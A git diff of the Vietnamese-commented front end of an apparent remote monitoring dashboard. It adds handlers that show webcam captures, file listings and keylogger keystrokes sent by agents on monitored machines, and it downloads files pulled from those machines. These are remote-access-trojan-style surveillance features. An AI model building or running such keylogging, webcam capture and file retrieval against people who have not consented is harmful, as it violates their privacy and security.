@@ -7,8 +7,19 @@ import { initSocket, onEvent, emitCommand } from './lib/socket.js';
 import { renderApp } from './templates/renderer.js';
 import { switchPanel } from './utils/dom.js';
 import { addMachineOnline, onTargetMachineChange } from './components/machine-selector.js';
-import { handleScreenTrigger, handleIncomingScreen, handleProcesses, handleIncomingAuditLog, fetchAndRenderAuditLogs } from './pages/monitor.js';
-import { handleWebcamTrigger, handlePowerCommand, toggleKeyloggerState, clearKeyloggerArea } from './pages/control.js';
+import {
+    handleScreenTrigger,
+    handleIncomingScreen,
+    handleProcesses,
+    handleIncomingAuditLog,
+    fetchAndRenderAuditLogs,
+    handleIncomingWebcam,
+    handleFileList,
+    handleIncomingKeylog,
+    toggleKlState,
+    clearKlArea
+} from './pages/monitor.js';
+import { handleWebcamTrigger, handlePowerCommand } from './pages/control.js';
 import { addAuditRow, logSystemEvent } from './utils/audit.js';
 import { isAuthenticated, getUser, logout, hasRole, adminListUsers, adminUpdateRole, adminDeleteUser, adminToggleActive } from './lib/api.js';
 import { renderAuthPage } from './pages/auth.js';
@@ -21,25 +32,25 @@ import { renderAuthPage } from './pages/auth.js';
 const checkAuth = async () => {
     // Xóa cache cũ - hard reset!
     const token = localStorage.getItem('auth_token');
-    
+
     // Nếu không có token → chắc chắn chưa login
     if (!token) {
         console.log('🔐 Không tìm thấy token → render auth page');
         renderAuthPage();
         return false;
     }
-    
+
     // Có token, kiểm tra backend có chạy không
     try {
         const response = await fetch('http://localhost:8000/api/me', {
             headers: { 'Authorization': `Bearer ${token}` }
         });
-        
+
         if (response.ok) {
             console.log('🔐 Token hợp lệ → render app');
             return true; // Token còn hiệu lực
         }
-        
+
         // Token hết hạn (401) → xóa và về trang login
         console.log('🔐 Token hết hạn → xóa và về login');
         localStorage.removeItem('auth_token');
@@ -60,7 +71,7 @@ const checkAuth = async () => {
 const startApp = async () => {
     const authenticated = await checkAuth();
     if (!authenticated) return;
-    
+
     console.log('🔐 Đã đăng nhập → render app');
     // =============================================
     // Bước 2: Render giao diện chính (đã đăng nhập)
@@ -75,8 +86,10 @@ const startApp = async () => {
     window.triggerScreen = handleScreenTrigger;
     window.triggerWebcam = handleWebcamTrigger;
     window.triggerPower = handlePowerCommand;
-    window.toggleKlState = toggleKeyloggerState;
-    window.clearKlArea = clearKeyloggerArea;
+
+    // 🎯 SỬA CHỐT ĐỒNG BỘ: Định tuyến trúng hàm xử lý chuẩn của monitor.js điều phối cờ phẳng Backend
+    window.toggleKlState = toggleKlState;
+    window.clearKlArea = clearKlArea;
 
     // Xử lý nút Kill tiến trình từ xa
     window.handleKillProcess = (pid, name) => {
@@ -244,6 +257,55 @@ const startApp = async () => {
         handleIncomingAuditLog(data);
     });
 
+    // 🚀 ĐOẠN ĐĂNG KÝ SỰ KIỆN MỚI CHO WEBCAM, SANDBOX, KEYLOGGER
+    onEvent('agent_send_webcam', (data) => {
+        handleIncomingWebcam(data);
+    });
+
+    onEvent('agent_send_files', (data) => {
+        handleFileList(data);
+    });
+
+    onEvent('agent_send_key', (data) => {
+        handleIncomingKeylog(data);
+    });
+
+    // 🎯 LUỒNG TIẾP NHẬN DATA FILE BASE64 VÀ ÉP TRÌNH DUYỆT TẢI XUỐNG CỨNG
+    onEvent('agent_download_ready', (data) => {
+        const incomingMachine = data.machine_name;
+        const activeSelection = document.getElementById('machine-select')?.value;
+
+        if (activeSelection && incomingMachine !== activeSelection) return;
+
+        if (data.file_base64 && data.file_name) {
+            try {
+                console.log(`💾 Đang tiến hành giải mã và tải tệp tin: ${data.file_name}`);
+
+                const byteCharacters = atob(data.file_base64);
+                const byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], { type: 'application/octet-stream' });
+
+                const link = document.createElement('a');
+                link.href = window.URL.createObjectURL(blob);
+                link.download = data.file_name;
+
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                window.URL.revokeObjectURL(link.href);
+
+                console.log(`✅ Đã tải xuống thành công tệp tin: ${data.file_name}`);
+            } catch (error) {
+                console.error("❌ Lỗi xử lý giải mã tệp tin tải về:", error);
+                alert("Không thể giải mã tệp tin dội về từ máy trạm!");
+            }
+        }
+    });
+
     onEvent('message', (data) => {
         console.log("📩 Thông báo hệ thống:", data);
     });
@@ -284,5 +346,5 @@ const startApp = async () => {
     bootstrapApp();
 };
 
-// Chạy ứng dụng
+// Kích hoạt chu trình chạy hệ thống
 startApp();
